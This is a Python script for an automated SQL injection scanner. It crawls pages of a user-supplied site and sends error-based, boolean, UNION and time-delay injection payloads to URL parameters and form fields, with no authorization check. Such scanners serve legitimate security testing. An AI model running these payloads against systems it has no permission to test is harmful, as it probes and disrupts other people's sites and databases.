import aiohttp
import asyncio
import time
import difflib
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

MAX_PAGES = 10
TIME_THRESHOLD = 4
SIMILARITY_THRESHOLD = 0.90
CONCURRENT_REQUESTS = 10

semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)

ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "' OR 1=1 --"]

BOOLEAN_PAYLOADS = [("' OR 1=1 --", "' OR 1=2 --")]

UNION_PAYLOADS = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
]

TIME_PAYLOADS = [
    "' OR SLEEP(5) --",
    "' OR pg_sleep(5) --",
    "'; WAITFOR DELAY '0:0:5' --",
]

SQL_ERRORS = [
    "sql syntax", "mysql", "warning: mysql", "pdo", "sqlite",
    "postgresql", "unclosed quotation", "you have an error in your sql",
    "supplied argument is not a valid mysql", "odbc microsoft access driver",
    "ora-", "microsoft jet database"
]


async def request(session, url, method="get", params=None, data=None):
    async with semaphore:
        try:
            start = time.time()

            if method == "post":
                async with session.post(url, data=data, timeout=10) as r:
                    text = await r.text(errors="replace")
            else:
                async with session.get(url, params=params, timeout=10) as r:
                    text = await r.text(errors="replace")

            return text, time.time() - start

        except:
            return "", 0


def similarity(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


def contains_sql_error(text):
    text = text.lower()
    return any(err in text for err in SQL_ERRORS)


def extract_forms(html):
    return BeautifulSoup(html, "html.parser").find_all("form")


def get_form_details(form):
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()

    inputs = []
    for tag in form.find_all(["input", "textarea", "select"]):
        name = tag.attrs.get("name")
        if name:
            inputs.append(name)

    return action, method, inputs


def normalize_netloc(url):
    return urlparse(url).netloc.replace("www.", "").lower()


def extract_links(base_url, html):
    soup = BeautifulSoup(html, "html.parser")
    links = set()

    for tag in soup.find_all("a", href=True):
        href = tag["href"].strip()

        if href.startswith(("javascript:", "mailto:", "#", "tel:")):
            continue

        full = urljoin(base_url, href).split("#")[0]
        if full:
            links.add(full)

    return links


async def crawl(session, start_url):
    visited = set()
    queue = [start_url]
    base_netloc = normalize_netloc(start_url)

    while queue and len(visited) < MAX_PAGES:
        url = queue.pop(0)

        if url in visited:
            continue

        html, _ = await request(session, url)
        visited.add(url)

        for link in extract_links(url, html):
            if normalize_netloc(link) == base_netloc and link not in visited:
                queue.append(link)

    return visited


async def test_param(session, url, param, params, baseline, results):

    tasks = []

    async def error_test(payload):
        test = dict(params)
        test[param] = payload
        resp, _ = await request(session, url, params=test)

        if contains_sql_error(resp):
            results.append({
                "type": "Error-Based SQLi",
                "url": url,
                "parameter": param,
                "payload": payload
            })

    async def boolean_test(true_p, false_p):
        true_params = dict(params)
        false_params = dict(params)

        true_params[param] = true_p
        false_params[param] = false_p

        true_resp, _ = await request(session, url, params=true_params)
        false_resp, _ = await request(session, url, params=false_params)

        if true_resp and false_resp:
            sim = similarity(true_resp, false_resp)
            if sim < SIMILARITY_THRESHOLD:
                results.append({
                    "type": "Boolean-Based SQLi",
                    "url": url,
                    "parameter": param,
                    "payload": f"{true_p} | {false_p}",
                    "similarity": round(sim, 3)
                })

    async def union_test(payload):
        test = dict(params)
        test[param] = payload
        resp, _ = await request(session, url, params=test)

        if resp and similarity(baseline, resp) < SIMILARITY_THRESHOLD:
            results.append({
                "type": "UNION-Based SQLi",
                "url": url,
                "parameter": param,
                "payload": payload
            })

    async def time_test(payload):
        test = dict(params)
        test[param] = payload
        _, duration = await request(session, url, params=test)

        if duration > TIME_THRESHOLD:
            results.append({
                "type": "Time-Based SQLi",
                "url": url,
                "parameter": param,
                "payload": payload,
                "duration": round(duration, 2)
            })

    for payload in ERROR_PAYLOADS:
        tasks.append(error_test(payload))

    for t, f in BOOLEAN_PAYLOADS:
        tasks.append(boolean_test(t, f))

    for payload in UNION_PAYLOADS:
        tasks.append(union_test(payload))

    for payload in TIME_PAYLOADS:
        tasks.append(time_test(payload))

    await asyncio.gather(*tasks)


async def scan_url_params(session, url, results):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return

    baseline, _ = await request(session, url)

    tasks = []
    for param in params:
        tasks.append(test_param(session, url, param, {k: v[0] for k, v in params.items()}, baseline, results))

    await asyncio.gather(*tasks)


async def scan_forms(session, url, results):
    html, _ = await request(session, url)
    forms = extract_forms(html)

    for form in forms:
        action, method, inputs = get_form_details(form)
        target = urljoin(url, action) if action else url

        if not inputs:
            continue

        data = {i: "test" for i in inputs}

        if method == "post":
            baseline, _ = await request(session, target, method="post", data=data)
        else:
            baseline, _ = await request(session, target, params=data)

        for payload in ERROR_PAYLOADS:
            test_data = {i: payload for i in inputs}

            if method == "post":
                resp, _ = await request(session, target, method="post", data=test_data)
            else:
                resp, _ = await request(session, target, params=test_data)

            if contains_sql_error(resp) or similarity(baseline, resp) < SIMILARITY_THRESHOLD:
                results.append({
                    "type": "Form SQLi",
                    "url": target,
                    "method": method.upper(),
                    "inputs": inputs,
                    "payload": payload
                })


def deduplicate(results):
    seen = set()
    unique = []

    for r in results:
        key = (r.get("type"), r.get("url"), r.get("parameter", ""), r.get("payload", ""))
        if key not in seen:
            seen.add(key)
            unique.append(r)

    return unique


async def scan_sql_injection(start_url):
    results = []

    headers = {"User-Agent": "SQLiScanner/fast"}
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        pages = await crawl(session, start_url)

        tasks = []
        for page in pages:
            tasks.append(scan_url_params(session, page, results))
            tasks.append(scan_forms(session, page, results))

        await asyncio.gather(*tasks)

    return deduplicate(results)


if __name__ == "__main__":
    target = input("Enter target URL: ").strip()

    if not target.startswith("http"):
        target = "http://" + target

    findings = asyncio.run(scan_sql_injection(target))

    print("\nSQL Injection Scan Results")
    print("=" * 60)

    if findings:
        for i, f in enumerate(findings, 1):
            print(f"\n[{i}] {f.get('type')}")
            print(f"URL: {f.get('url')}")

            if "parameter" in f:
                print(f"Parameter: {f.get('parameter')}")

            if "method" in f:
                print(f"Method: {f.get('method')}")

            if "payload" in f:
                print(f"Payload: {f.get('payload')}")

            if "similarity" in f:
                print(f"Similarity Score: {f.get('similarity')}")

            if "duration" in f:
                print(f"Response Delay: {f.get('duration')}s")

    else:
        print("\nNo SQL injection indicators detected.")
